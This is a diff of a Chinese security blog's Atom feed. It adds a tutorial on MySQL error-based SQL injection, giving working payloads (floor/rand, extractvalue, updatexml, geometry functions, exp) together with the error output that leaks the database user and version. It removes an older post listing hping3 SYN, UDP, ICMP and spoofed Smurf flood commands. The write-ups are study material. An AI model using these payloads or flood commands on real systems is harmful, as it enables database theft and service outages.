@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknowsec.cn/"/>
-  <updated>2017-11-16T14:44:10.154Z</updated>
+  <updated>2017-11-17T14:31:45.911Z</updated>
   <id>http://uknowsec.cn/</id>
   
   <author>
@@ -14,6 +14,90 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>MySQL Error Based SQL Injection （报错注入）总结</title>
+    <link href="http://uknowsec.cn/posts/notes/MySQL%20Error%20Based%20SQL%20Injection%20%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89%E6%80%BB%E7%BB%93.html"/>
+    <id>http://uknowsec.cn/posts/notes/MySQL Error Based SQL Injection （报错注入）总结.html</id>
+    <published>2017-11-17T08:42:00.000Z</published>
+    <updated>2017-11-17T14:31:45.911Z</updated>
+    
+    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="MySQL报错注入"><a href="#MySQL报错注入" class="headerlink" title="MySQL报错注入"></a>MySQL报错注入</h2><p>利用数据库报错来显示数据的注入方式经常会在入侵中利用到，这种方法有一点局限性，需要页面有错误回显。</p>
+<p>数据类型转换报错是最常见的一种方法，在微软SQL Server上，利用的是convert()和cast()函数，MySQL的报错SQL注入方式更多。</p>
+<p>有很多函数都会导致MySQL报错并且显示出数据，它们分别是</p>
+<ul>
+<li>GemetryCollection()</li>
+<li>polygon(),GTID_SUBSET()</li>
+<li>multipoint()</li>
+<li>multinestring()</li>
+<li>multipolygon()</li>
+<li>LINESTRING()</li>
+<li>exp()</li>
+</ul>
+<p>MYSQL报错注入大体可以分为以下几类：</p>
+<ul>
+<li>BIGINT等数据类型溢出</li>
+<li>xpath语法错误</li>
+<li>concat+rand()+group_by()导致主键重复</li>
+<li>空间数据类型函数错误</li>
+</ul>
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><h3 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from admin where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</div></pre></td></tr></table></figure>
+<ul>
+<li>floor：函数只返回整数部分，小数部分舍弃。</li>
+<li>round：函数四舍五入，大于0.5的部分进位，不到则舍弃。</li>
+</ul>
+<h3 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h3><p>目前比较常见的几种报错注入的方法都是利用了mysql某些不能称为bug的bug来实现的。</p>
+<p>下面就以 rand() 函数来进行说明。mysql的官方文档中对 rand() 函数有特殊的说明：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">RAND() in a WHERE clause is re-evaluated every time the WHERE is executed. You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. However, you can retrieve rows in random order like this:</div></pre></td></tr></table></figure>
+<p>官方文档中的意思是：在where语句中，where每执行一次，rand()函数就会被计算一次。rand()不能作为order by的条件字段，同理也不能作为group by的条件字段。</p>
+<p>因此在mysql中，可以构造一个值不确定而有可重复的字段作为group by的条件字段，这是就可以报出类似于Duplicate entry ‘…’ for key ‘group_key’的错误</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from admin where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</div><div class="line"></div><div class="line">1062 - Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;</div><div class="line"></div><div class="line"></div><div class="line">mysql&gt; select * from admin where id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</div><div class="line"></div><div class="line">1062 - Duplicate entry &apos;5.5.531&apos; for key &apos;group_key&apos;</div></pre></td></tr></table></figure>
+<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p>
+<p>因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。</p>
+<h3 id="注入语句-1"><a href="#注入语句-1" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from admin where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</div></pre></td></tr></table></figure>
+<h3 id="报错注入原理-1"><a href="#报错注入原理-1" class="headerlink" title="报错注入原理"></a>报错注入原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXTRACTVALUE (XML_document, XPath_string);</div></pre></td></tr></table></figure>
+<ul>
+<li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </li>
+<li>第二个参数：XPath_string (Xpath格式的字符串). </li>
+<li>作用：从目标XML中返回包含所查询值的字符串</li>
+</ul>
+<p>第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里</p>
+<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from admin where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</div><div class="line">1105 - XPATH syntax error: &apos;~root@localhost~&apos;</div><div class="line"></div><div class="line"></div><div class="line">mysql&gt; select * from admin where id=1 and (extractvalue(1,concat(0x7e,(select version()),0x7e)));</div><div class="line">1105 - XPATH syntax error: &apos;~5.5.53~&apos;</div></pre></td></tr></table></figure>
+<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p>
+<p>因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。</p>
+<h3 id="注入语句-2"><a href="#注入语句-2" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from admin where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</div></pre></td></tr></table></figure>
+<h3 id="报错注入原理-2"><a href="#报错注入原理-2" class="headerlink" title="报错注入原理"></a>报错注入原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATEXML (XML_document, XPath_string, new_value);</div></pre></td></tr></table></figure>
+<ul>
+<li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </li>
+<li>第二个参数：XPath_string (Xpath格式的字符串)</li>
+<li>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </li>
+<li>作用：改变文档中符合条件的节点的值</li>
+</ul>
+<p>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p>
+<p>通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。</p>
+<h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from admin where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</div><div class="line">1105 - XPATH syntax error: &apos;~root@localhost~&apos;</div><div class="line"></div><div class="line"></div><div class="line">mysql&gt; select * from admin where id=1 and (updatexml(1,concat(0x7e,(select version()),0x7e),1));</div><div class="line">1105 - XPATH syntax error: &apos;~5.5.53~&apos;</div></pre></td></tr></table></figure>
+<h2 id="GemetryCollection-multipoint-polygon-multipolygon-linestring-multilinestring"><a href="#GemetryCollection-multipoint-polygon-multipolygon-linestring-multilinestring" class="headerlink" title="GemetryCollection() multipoint() polygon() multipolygon() linestring() multilinestring()"></a>GemetryCollection() multipoint() polygon() multipolygon() linestring() multilinestring()</h2><p>以上函数均为MySQL中的空间数据类型（存储）的函数</p>
+<p>目前仅在MyISAM数据引擎下提供空间索引支持,要求几何字段非空</p>
+<h3 id="注入语句-3"><a href="#注入语句-3" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">select * from products where pid=1 and geometrycollection((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">select * from products where pid=1 and multipoint((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">select * from products where pid=1 and polygon((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">select * from products where pid=1 and multipolygon((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">select * from products where pid=1 and linestring((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">select * from products where pid=1 and multilinestring((select * from(select * from(select user())a)b));</div></pre></td></tr></table></figure>
+<h3 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from products where pid=1 and geometrycollection((select * from(select * from(select user())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</div><div class="line">mysql&gt; select * from products where pid=1 and geometrycollection((select * from(select * from(select version())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</div><div class="line"></div><div class="line">mysql&gt; select * from products where pid=1 and multipoint((select * from(select * from(select user())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</div><div class="line">mysql&gt; select * from products where pid=1 and multipoint((select * from(select * from(select version())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</div><div class="line"></div><div class="line">mysql&gt; select * from products where pid=1 and polygon((select * from(select * from(select user())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</div><div class="line">mysql&gt; select * from products where pid=1 and polygon((select * from(select * from(select version())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</div><div class="line"></div><div class="line">mysql&gt; select * from products where pid=1 and multipolygon((select * from(select * from(select user())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</div><div class="line">mysql&gt; select * from products where pid=1 and multipolygon((select * from(select * from(select version())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</div><div class="line"></div><div class="line">mysql&gt; select * from products where pid=1 and linestring((select * from(select * from(select user())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</div><div class="line">mysql&gt; select * from products where pid=1 and linestring((select * from(select * from(select version())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</div><div class="line"></div><div class="line">mysql&gt; select * from products where pid=1 and multilinestring((select * from(select * from(select user())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</div><div class="line">mysql&gt; select * from products where pid=1 and multilinestring((select * from(select * from(select version())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</div></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h2><p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。</p>
+<p>利用exp函数也产生类似的溢出错误</p>
+<h3 id="注入语句-4"><a href="#注入语句-4" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from products where pid=1 and exp(~(select * from(select user())a));</div></pre></td></tr></table></figure>
+<h3 id="测试-4"><a href="#测试-4" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from products where pid=1 and exp(~(select * from(select user())a));</div><div class="line">1690 - DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</div><div class="line"></div><div class="line">mysql&gt; select * from admin where id=1 and exp(~(select * from(select version())a));</div><div class="line">1690 - DOUBLE value is out of range in &apos;exp(~((select `a`.`version()` from (select version() AS `version()`) `a`)))&apos;</div></pre></td></tr></table></figure>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://wooyun.jozxing.cc/static/drops/tips-14312.html" target="_blank" rel="external">Mysql报错注入原理分析(count()、rand()、group by)</a><br><a href="https://n0tr00t.com/2014/11/16/error-based-sql-injection.html" target="_blank" rel="external">Error Based SQL Injection</a><br><a href="https://edu.aqniu.com/article/54" target="_blank" rel="external">MYSQL报错注入的一点总结</a><br><a href="https://www.cnblogs.com/MiWhite/p/6228491.html" target="_blank" rel="external">UpdateXml() MYSQL显错注入</a><br><a href="http://www.cnseay.com/4239/" target="_blank" rel="external">《代码审计：企业级Web代码安全架构》</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;点击阅读全文&lt;br&gt;
+    
+    </summary>
+    
+      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>php支持的协议和封装协议小结</title>
@@ -455,7 +539,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#x66;&#111;&#111;&#x40;&#x62;&#97;&#x72;&#x2e;&#x63;&#x6f;&#109;">&#x66;&#111;&#111;&#x40;&#x62;&#97;&#x72;&#x2e;&#x63;&#x6f;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x66;&#x6f;&#x6f;&#64;&#98;&#97;&#x72;&#46;&#99;&#x6f;&#109;">&#x66;&#x6f;&#x6f;&#64;&#98;&#97;&#x72;&#46;&#99;&#x6f;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
@@ -2138,102 +2222,6 @@
 <h3 id="添加用户口令"><a href="#添加用户口令" class="headerlink" title="添加用户口令"></a>添加用户口令</h3><p>添加rsync用户权限访问，注意配置的是rsyncd.conf中的：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">secrets file = /etc/rsyncd.secrets #密码文件位置，认证文件设置，设置用户名和密码</div><div class="line">auth users = rsync #授权帐号,认证的用户名，如果没有这行则表明是匿名，多个用户用,分隔。</div></pre></td></tr></table></figure>
 <p>参考链接：<br><a href="http://wooyun.jozxing.cc/static/drops/papers-161.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/papers-161.html</a><br><a href="http://www.91ri.org/11093.html" target="_blank" rel="external">http://www.91ri.org/11093.html</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;点击阅读全文&lt;br&gt;
-    
-    </summary>
-    
-      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>浅谈ddos的测试方法</title>
-    <link href="http://uknowsec.cn/posts/skill/%E6%B5%85%E8%B0%88ddos%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html"/>
-    <id>http://uknowsec.cn/posts/skill/浅谈ddos的测试方法.html</id>
-    <published>2017-07-12T06:22:32.000Z</published>
-    <updated>2017-07-13T01:00:54.056Z</updated>
-    
-    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
-<p>DOS（denial of service–拒绝服务）攻击的目的是使服务正常功能不可用。不像其他类型的攻击的目的是获取敏感信息，Dos攻击是不会威胁到敏感信息而是使合法用户不能使用服务。有时候Dos在其他攻击中也会存在一定的作用，比如使web应用防火墙拒绝服务，从而绕过防火墙。</p>
-<h2 id="DOS与DDOS的区别"><a href="#DOS与DDOS的区别" class="headerlink" title="DOS与DDOS的区别"></a>DOS与DDOS的区别</h2><p>Dos是拒绝服务攻击，而DDOS是分布式拒绝服务攻击；Dos与DDOS都是攻击目标服务器、网络服务的一种方式。Dos是利用自己的计算机攻击目标，也是一对一的关系，而DDOS是DoS攻击基础之上产生的一种新的攻击方式,利用控制成百上千台肉鸡，组成一个DDOS攻击群，同一时刻对目标发起攻击。</p>
-<p>从理论上来说，无论目标服务器、网络服务的资源多大，也是带宽、内存、CPU多大，都无法避免Dos与DDOS攻击，因此任何资源再大也有一个极限值，比如说，一台服务器每秒可以处理1000个数据包，而通过DOS攻击给这台服务器发送1001个数据包，这时服务器无法正常运行，需要给服务器扩容。 从技术上来说，DOS和DDOS都是攻击目标服务器的带宽和连通性，使得目标服务器的带宽资源耗尽，无法正常运行。</p>
-<h2 id="DOS的类型"><a href="#DOS的类型" class="headerlink" title="DOS的类型"></a>DOS的类型</h2><p>Dos是拒绝服务攻击，而DDOS是分布式拒绝服务攻击；Dos与DDOS都是攻击目标服务器、网络服务的一种方式。Dos是利用自己的计算机攻击目标，也是一对一的关系，而DDOS是DoS攻击基础之上产生的一种新的攻击方式,利用控制成百上千台肉鸡，组成一个DDOS攻击群，同一时刻对目标发起攻击。</p>
-<p>从理论上来说，无论目标服务器、网络服务的资源多大，也是带宽、内存、CPU多大，都无法避免Dos与DDOS攻击，因此任何资源再大也有一个极限值，比如说，一台服务器每秒可以处理1000个数据包，而通过DOS攻击给这台服务器发送1001个数据包，这时服务器无法正常运行，需要给服务器扩容。 从技术上来说，DOS和DDOS都是攻击目标服务器的带宽和连通性，使得目标服务器的带宽资源耗尽，无法正常运行。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos.jpg" alt=""></p>
-<h2 id="网络和传输层攻击"><a href="#网络和传输层攻击" class="headerlink" title="网络和传输层攻击"></a>网络和传输层攻击</h2><p>这种攻击方式通常是向服务器发送恶意流量，尽可能消耗服务器的资源来达到拒绝服务的目的。</p>
-<h3 id="TCP-SYN-floods"><a href="#TCP-SYN-floods" class="headerlink" title="TCP SYN floods"></a>TCP SYN floods</h3><p>SYN洪水攻击在传输层，为了更好的理解这种类型的攻击，我们需要先了解TCP的三次握手。</p>
-<p>先来看张图如下：</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos1.jpg" alt=""></p>
-<p>对照上图来理解一下：</p>
-<p>第一次握手：建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x；然后，客户端进入SYN_SEND状态，等待服务器的确认；</p>
-<p>第二次握手：服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1)；同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态；</p>
-<p>第三次握手：客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。 完成了三次握手，客户端和服务器端就可以开始传送数据。</p>
-<p>如果攻击者发送足够的SYN数据包，因为服务器的并发TCP连接数量有限所以会导致服务器没有更多的资源可用。 如果服务器达到限制，在现有的处于SYN-RCVD状态的连接超时之前则不能在建立新的连接，这就造成了拒绝服务攻击。</p>
-<p>SYN洪水攻击测试工具，我们可以用hping3，下载地址：<a href="http://www.hping.org/hping3.html" target="_blank" rel="external">http://www.hping.org/hping3.html</a></p>
-<p>命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 简单例子： hping3 -S --flood -V -p TARGET_PORT TARGET_SITE</div><div class="line"></div><div class="line">2 随机源IP： hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE</div></pre></td></tr></table></figure>
-<h3 id="UDP-floods"><a href="#UDP-floods" class="headerlink" title="UDP floods"></a>UDP floods</h3><p>UDP协议是无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。</p>
-<p>由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。这种攻击的原理是通过伪造的IP向目标服务器发送大量的UDP数据包，服务器在接收到数据包后无法处理每一条请求，并且通过向服务器发送ICMP “destination unreachable”来消耗其带宽。</p>
-<p>测试工具：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 hping3 命令：hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP</div><div class="line"></div><div class="line">2 loic 下载地址： https://sourceforge.net/projects/loic/</div></pre></td></tr></table></figure>
-<h3 id="TCP-FIN-Flood"><a href="#TCP-FIN-Flood" class="headerlink" title="TCP FIN Flood"></a>TCP FIN Flood</h3><p>这种FIM标志的数据包只有在TCP建立连接之后才会被接受，如果没有建立TCP连接，那么这个标志的数据包将会被简单的删除处理。</p>
-<p>如果攻击者只是在没有建立TCP连接的情况下对服务器进行泛洪攻击，那么FIN数据包将会别丢弃，但是服务器还是会分配一些资源来查看数据包防止冗余。</p>
-<p>这种攻击很容易被实现。</p>
-<p>测试工具：hping3</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -F -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
-<h3 id="TCP-RST-Flood"><a href="#TCP-RST-Flood" class="headerlink" title="TCP RST Flood"></a>TCP RST Flood</h3><p>TCP中的RST包的意思是立即断开连接，当连接出错需要停止掉的时候非常有用。</p>
-<p>如果攻击者能够以某种方式查看从源到目的地的流量，则可以发送具有适当值的RST报文（源IP，目的IP，源端口，目的端口，序列号等），该报文将断开源和目的地之间的TCP连接。 这也是一种拒绝服务的方式。</p>
-<p>RST泛洪的测试工具也是hping3</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -R -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
-<h3 id="PUSH-and-ACK-Flood"><a href="#PUSH-and-ACK-Flood" class="headerlink" title="PUSH and ACK Flood"></a>PUSH and ACK Flood</h3><p>通过大量的PUSH和ACK泛洪可以是服务器停止对正常用户的请求进行响应。</p>
-<p>测试工具：hping3 和 LOIC</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -PA -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
-<h3 id="ICMP-and-IGMP-Floods"><a href="#ICMP-and-IGMP-Floods" class="headerlink" title="ICMP and IGMP Floods"></a>ICMP and IGMP Floods</h3><p>ICMP（Internet Control Message Protocol–Internet控制消息协议）和IGMP（Internet Group Management Protocol–Internet组管理协议）是网络层的协议类似于UDP。ICMP递送状态消息，错误报告，回答某些请求，报告路由信息，并且常用于测试网络的连通性和排查问题。IGMP是IP网络上的系统和相邻路由用来建立和维护多播组成员关系的协议。</p>
-<p>ICMP and IGMP Floods类似于UDP不需要任何漏洞，只需要发送大量的ICMP或IGMP数据包，在处理每一个数据包的时候资源消耗殆尽导致拒绝服务。</p>
-<p>测试工具：hping3</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -1 -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
-<h2 id="放大攻击"><a href="#放大攻击" class="headerlink" title="放大攻击"></a>放大攻击</h2><p>利用回复包比请求包大的特点（放大流量），伪造请求包的源IP地址，将应答包引向被攻击的目标。例如：攻击者伪造源IP为目标的IP然后使用路由广播IP地址向多个IP发送消息，然后这些设备都向目标IP进行回应。如图：</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos2.jpg" alt=""></p>
-<p>想要使用放大攻击必须使用不需要验证源IP的无连接协议，像DNS、ICMP（ Smurf attack）、UDP（Fraggle attack）等协议。</p>
-<h3 id="Smurf-Attack"><a href="#Smurf-Attack" class="headerlink" title="Smurf Attack"></a>Smurf Attack</h3><p>攻击者会选择一些中间站点作为放大器，然后发送巨大数量ICMP（ping）请求到这些中间站点的广播IP。通过这种方式，将所有的源IP改为目标的IP地址，这些中间地址将这些数据包广播到所有子网的主机。最后所有主机的回应都发回给目标。</p>
-<p>测试工具:hping3</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --icmp --spoof TARGET_IP BROADCAST_IP</div></pre></td></tr></table></figure>
-<h3 id="DNS-Amplification"><a href="#DNS-Amplification" class="headerlink" title="DNS Amplification"></a>DNS Amplification</h3><p>当前许多DNS服务器支持EDNS。EDNS是DNS的一套扩大机制，RFC 2671对此有介绍。一些选择能够让DNS回复超过512字节并且仍然使用UDP，如果要求者指出它能够处理这样大的DNS查询的话。攻击者已经利用这种方法产生了大量的通讯。通过发送一个60个字节的查询来获取一个大约4000个字节的记录，攻击者能够把通讯量放大66倍。一些这种性质的攻击已经产生了 每秒钟许多GB的通讯量，对于某些目标的攻击甚至超过了每秒钟10GB的通讯量。<br>下面看两个图，正常的查询:</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos3.jpg" alt=""></p>
-<p>下面是放大攻击的图：</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos4.jpg" alt=""></p>
